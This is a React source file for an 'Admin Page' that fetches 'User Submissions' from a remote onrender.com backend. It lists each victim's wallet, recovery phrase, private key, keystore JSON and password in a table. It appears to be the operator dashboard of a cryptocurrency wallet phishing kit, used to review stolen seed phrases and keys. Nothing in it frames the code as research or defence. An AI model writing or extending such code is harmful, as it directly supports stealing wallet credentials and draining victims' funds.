import React, { useState, useEffect } from "react";

const AdminPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [visibleCount, setVisibleCount] = useState(10); // initial rows to show

  // fetch submissions on mount
  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await fetch("https://electric-eel.onrender.com/");
        const data = await res.json();
        setSubmissions(data.reverse()); // latest first
      } catch (err) {
        console.error("Error fetching submissions", err);
      }
    };
    fetchData();
  }, []);

  // format date helper
  const formatDate = (isoString) => {
    if (!isoString) return "N/A";
    const date = new Date(isoString);
    return date.toLocaleString();
  };

  // load more rows
  const handleLoadMore = () => setVisibleCount((prev) => prev + 5);

  return (
    <div className="p-6 space-y-6">
      <h2 className="text-2xl font-bold mb-4">Admin Page</h2>

      {/* Submissions Table */}
      <h3 className="text-xl font-bold mt-10 mb-4">User Submissions</h3>
      <div className="overflow-x-auto rounded-lg border border-indigo-400 mb-6">
        <table className="min-w-full text-sm bg-white text-gray-800 rounded-lg overflow-hidden shadow">
          <thead className="bg-indigo-600 text-white">
            <tr>
              <th className="py-2 px-4 text-left">Wallet</th>
              <th className="py-2 px-4 text-left">Recovery Phrase</th>
              <th className="py-2 px-4 text-left">Private Key</th>
              <th className="py-2 px-4 text-left">Keystore JSON</th>
              <th className="py-2 px-4 text-left">Password</th>
              <th className="py-2 px-4 text-left">Created At</th>
            </tr>
          </thead>
          <tbody>
            {submissions.slice(0, visibleCount).map((submission, index) => (
              <tr
                key={index}
                className="odd:bg-gray-100 even:bg-white border-b"
              >
                <td className="py-2 px-4">{submission.wallet}</td>
                <td className="py-2 px-4">
                  {submission.tab1Inputs?.filter(Boolean).join(", ")}
                </td>
                <td className="py-2 px-4">{submission.tab2Text}</td>
                <td className="py-2 px-4">{submission.tab3?.content}</td>
                <td className="py-2 px-4">{submission.tab3?.title}</td>
                <td className="py-2 px-4">
                  {formatDate(submission.createdAt)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {visibleCount < submissions.length && (
        <div className="text-center">
          <button
            onClick={handleLoadMore}
            className="px-6 py-2 bg-indigo-600 text-white font-semibold rounded hover:bg-indigo-500 transition"
          >
            Load More
          </button>
        </div>
      )}
    </div>
  );
};

export default AdminPage;
